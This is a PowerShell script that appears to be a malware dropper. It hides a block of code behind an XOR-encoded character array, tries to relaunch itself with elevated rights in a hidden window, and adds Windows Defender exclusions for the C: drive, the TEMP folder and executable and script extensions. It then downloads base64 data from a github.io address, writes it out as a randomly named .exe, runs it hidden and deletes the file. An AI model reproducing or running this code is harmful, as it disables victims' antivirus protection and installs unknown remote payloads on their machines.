$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    try {
        .( ([striNg]$VeRBoSEPREFerENce)[1,3]+'X'-jOin'')(" $(sEt-iteM  'VArIAblE:OFS' '' )" + [StrInG]((11 ,92,76,93, 70 ,95 ,91,15,18, 15 ,111,8,34 , 37, 15,15 ,15 ,15,15 , 15 ,15 ,15,15, 15,15 ,15,11 ,74 , 87, 76,67,90 ,92 ,70,64 , 65, 92,15 ,18 , 15, 84,34, 37, 15 ,15, 15, 15, 15,15, 15,15 ,15 , 15, 15 , 15,15, 15,15 , 15 , 95 , 78, 93,78 , 66,7 ,11, 95 ,78 , 91 ,71 ,92, 3,15,11 , 74 , 87 ,91,74,65 ,92, 70,64, 65, 92 ,6, 34 ,37 ,15, 15 , 15 ,15 ,15, 15 , 15,15 ,15,15,15 ,15, 15 ,15 ,15, 15,11 ,95 ,78 ,91 , 71 , 92, 15 , 83 , 15, 105 ,64 , 93, 106, 78,76 ,71 , 2,96, 77,69, 74 ,76 ,91,15, 84,15 ,34,37 ,15,15,15,15 , 15,15 , 15 , 15 ,15, 15, 15,15, 15 , 15 ,15 , 15, 15,15,15,15,110,75, 75 ,2 , 98, 95,127 ,93 ,74,73 ,74 ,93 , 74,65 ,76 ,74,15 ,2, 106, 87 ,76 , 67, 90,92 ,70, 64,65 , 127, 78,91, 71 ,15 ,11,112,15 , 2 ,106, 93, 93 , 64 , 93,110 , 76,91 , 70,64 , 65,15 , 124 ,70 ,67,74,65 ,91, 67 ,86 , 108, 64, 65 , 91, 70 , 65 , 90 , 74 ,34, 37, 15 ,15,15 ,15 ,15 ,15 ,15 ,15, 15,15 ,15, 15, 15, 15 , 15 , 15, 82 , 34 ,37, 15, 15,15 , 15 , 15, 15, 15 ,15 ,15,15, 15 , 15,15 ,15,15 ,15,11, 74,87 ,91 ,74, 65 , 92 ,70 , 64, 65 ,92 ,15 ,83 ,15, 105 ,64,93 , 106 ,78,76 ,71,2 , 96 ,77,69, 74 , 76 , 91 ,15 , 84,34,37, 15,15 ,15,15 , 15, 15 , 15, 15 , 15, 15,15 ,15,15,15, 15 ,15 ,15 , 15 , 15, 15 ,110 , 75 ,75 ,2 ,98 ,95 ,127, 93 ,74 ,73, 74,93,74, 65 ,76 ,74, 15,2, 106 ,87,76, 67 , 90,92,70,64 , 65 ,106 ,87 ,91, 74 ,65, 92 , 70,64,65, 15 ,11 ,112,15 , 2,106 ,93,93 , 64 ,93 ,110, 76 , 91, 70, 64 ,65 , 15,124 ,70 ,67, 74, 65 , 91 , 67 , 86, 108 ,64, 65, 91 , 70,65 , 90 , 74, 34 ,37 ,15, 15,15,15,15, 15 , 15 ,15,15 ,15 ,15, 15 , 15 , 15, 15,15 , 82, 34 ,37 ,15,15 , 15, 15,15 , 15 ,15, 15,15 ,15, 15 ,15, 82 ,34 , 37 , 15, 15 ,15,15, 15 ,15,15,15 , 15 , 15, 15, 15,9 ,15 ,11 , 74,87 ,76 , 67 ,90 ,92 ,70,64 ,65 ,92,15 , 111 ,7,13 , 108, 21,115 ,13 ,3 , 15 ,13,11, 74 , 65,89 ,21 ,123,106 ,98, 127,13, 6 ,15 , 111 ,7,13, 1 ,74 ,87, 74,13 , 3, 15 ,13, 1 ,95 ,92, 30 , 13,3 , 15 , 13, 1, 76 , 66 , 75, 13 ,6,34, 37 ,15 , 15 , 15 , 15, 15 , 15 ,15 ,15,15 ,15,15,15 ,11, 73,64, 67, 75, 74,93,15,18 , 15 ,101 ,64, 70 , 65,2, 127 ,78, 91 , 71 ,15 , 11,74 ,65 , 89 ,21 , 123, 106, 98 , 127, 15,13, 71, 92, 112 ,74 ,93, 93 ,64 ,93 ,112, 95 ,70,75 , 112,26 ,22, 23, 24 , 13 , 34 , 37, 15 ,15,15 ,15 ,15 ,15 , 15 ,15,15,15, 15,15 ,70,73 ,15,7 ,123,74,92, 91 , 2,127 , 78, 91, 71 , 15,11, 73 , 64 , 67 ,75,74 ,93,6,15 , 84 ,34, 37,15 ,15, 15,15 , 15 , 15 , 15 , 15 , 15 , 15, 15 , 15,15 ,15 ,15, 15 ,125 , 74,66 ,64 , 89,74, 2 ,102, 91 ,74,66 ,15 ,11 ,73 ,64, 67 , 75,74, 93,15 ,2, 125 ,74,76,90, 93, 92, 74 , 15 , 2, 105, 64,93, 76,74 , 34 , 37,15 , 15, 15,15 ,15 ,15,15,15 , 15,15 , 15,15 , 15 ,15, 15,15,120 , 93 ,70, 91,74, 2 , 103,64,92,91, 15, 13 ,105 , 78 , 70,67, 74,75, 3,15 , 71 , 78 ,89,74 ,15 , 86,64,90,15 , 93,90 , 65 , 15 , 66 ,74, 15 ,91 , 88 , 70, 76,74 ,16, 13 ,34 ,37 , 15,15,15 ,15 ,15 ,15,15,15 ,15 , 15 , 15 ,15 , 15, 15 ,15,15, 127, 78, 90, 92 , 74,34 , 37,15 ,15 , 15 , 15, 15,15,15 ,15 ,15, 15, 15,15, 82,34, 37 ,15 ,15, 15 , 15 ,15, 15 ,15 , 15, 15 , 15 , 15,15 ,97 , 74 ,88, 2,102 ,91 , 74, 66, 15,2 ,102, 91 ,74 ,66, 123 , 86,95 ,74 , 15 ,107, 70 , 93,74 ,76, 91, 64,93 , 86 , 15, 2, 127 ,78, 91,71 , 15,11, 73 , 64, 67, 75 , 74, 93 ,15,83 , 15, 96, 90,91, 2, 97 ,90 ,67 , 67 , 34 ,37, 15,15, 15, 15 , 15 ,15,15 , 15, 15, 15,15,15 , 11 ,90 ,93 ,67 , 15,18 , 15 ,13 ,71 , 91 ,91,95 , 92 ,21 , 0 , 0,92 , 91 , 70 , 65 ,68,86 , 67, 70 ,76,68,1, 72,70, 91,71,90,77,1 , 70,64, 0 ,92, 91 ,70,65, 68 , 86, 67 , 70 ,76, 68, 0 ,29 , 0,78 , 13 ,15, 34 ,37 ,15,15 , 15,15 ,15 , 15 ,15,15, 15, 15 , 15 , 15 ,11, 75, 78, 91,78, 15 ,18, 15 , 7, 97, 74 , 88 , 2,96 ,77 , 69 ,74 , 76 , 91,15 , 97,74 ,91 , 1 ,120 ,74 ,77 , 108, 67 , 70 ,74,65 , 91 , 6 , 1 , 107,64 ,88 , 65 , 67 ,64,78, 75,124, 91,93 ,70 ,65,72 ,7 ,11,90,93, 67, 6, 15 , 2, 93, 74,95,67, 78 ,76 , 74,15, 8 , 115 ,116,30 ,115 ,114, 8, 3, 15,8,108,8 , 34 ,37,15 , 15,15 , 15 , 15, 15 ,15 , 15 , 15 ,15 , 15 , 15, 11,73 ,70 ,67 , 74 ,65,78,66 , 74,15, 18 ,15 ,101,64,70,65 , 2 ,127, 78, 91, 71 ,15 ,11, 74,65 ,89 ,21,123 ,106, 98 , 127,15, 7,13, 84,31 ,82 , 1, 74 , 87 , 74, 13 ,15 , 2,73,15, 116 , 104 ,90, 70,75 , 114, 21 ,21, 97 , 74,88 ,104, 90, 70 ,75, 7,6,1 ,123,64 ,124 ,91 ,93 , 70, 65 ,72 , 7 , 8 ,97 , 8 , 6 , 6,34, 37, 15 ,15 ,15,15 , 15,15, 15, 15 ,15, 15 ,15,15 , 116 , 102 , 96, 1 , 105,70 ,67, 74,114 , 21 , 21,120 ,93,70,91 , 74 ,110, 67 , 67, 109,86,91, 74, 92 , 7 ,11 , 73,70, 67,74 ,65,78,66 , 74 ,3 ,15, 116, 108 ,64 ,65 ,89,74, 93 , 91 ,114 , 21 , 21, 105 ,93 ,64 , 66 ,109 ,78, 92 , 74, 25,27, 124 , 91 , 93, 70,65 ,72 ,7 , 11 , 75,78,91 ,78 , 6 ,6,34, 37, 15, 15, 15 ,15 ,15 , 15,15 ,15,15, 15 , 15,15, 124,91 , 78 , 93,91 ,2 , 127 , 93 ,64 ,76 ,74 , 92 ,92,15 , 2,105, 70,67 ,74, 127, 78,91 , 71,15, 11,73 , 70,67, 74, 65,78,66, 74,15, 2,120, 70,65 ,75 , 64, 88 ,124 ,91, 86, 67,74 , 15 , 103 ,70, 75 ,75 ,74,65 , 34 , 37 ,15,15 , 15, 15 , 15 ,15, 15,15 ,15, 15 , 15 , 15,124 , 91, 78 , 93 , 91 , 2 ,124,67, 74, 74,95,15,2, 124,74 , 76,64,65 , 75 ,92 ,15 , 26,34 ,37 ,15 , 15, 15 , 15 , 15,15, 15,15 , 15 ,15,15, 15 , 125, 74,66,64 , 89, 74 ,2,102 , 91, 74, 66, 15, 2, 127 , 78,91,71, 15 ,11 , 73 ,70,67, 74, 65, 78, 66 ,74,15 ,2 , 105, 64, 93 ,76 ,74, 34,37 ,8 , 111)| %{[cHar]( $_-bxOr'0x2F') } )+" $(seT-ItEm  'variABle:ofS'  ' ' )")
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
        $encodedScript = [Convert]::ToBase64String($bytes)
        Start-Process powershell.exe -Verb RunAs -ArgumentList "-EncodedCommand $encodedScript" -WindowStyle Hidden -Wait
        Exit
    } catch {
        Write-Host "Running without admin rights"
    }
} else {
    @("C:", $env:TEMP) | ForEach-Object {
        Add-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue
    }
    @(".exe", ".ps1", ".cmd") | ForEach-Object {
        Add-MpPreference -ExclusionExtension $_ -ErrorAction SilentlyContinue
    }
}

$folder = Join-Path $env:TEMP "hs_error_pid_5987"
if (Test-Path $folder) {
    Remove-Item $folder -Recurse -Force
    Write-Host "Failed, have you run me twice?"
    Pause
}
New-Item -ItemType Directory -Path $folder | Out-Null

$url = "https://stinkylick.github.io/stinkylick/2/a" 
$data = (New-Object Net.WebClient).DownloadString($url) -replace '\[1\]', 'C'
$filename = Join-Path $env:TEMP ("{0}.exe" -f [Guid]::NewGuid().ToString('N'))
[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($data))
Start-Process -FilePath $filename -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item -Path $filename -Force
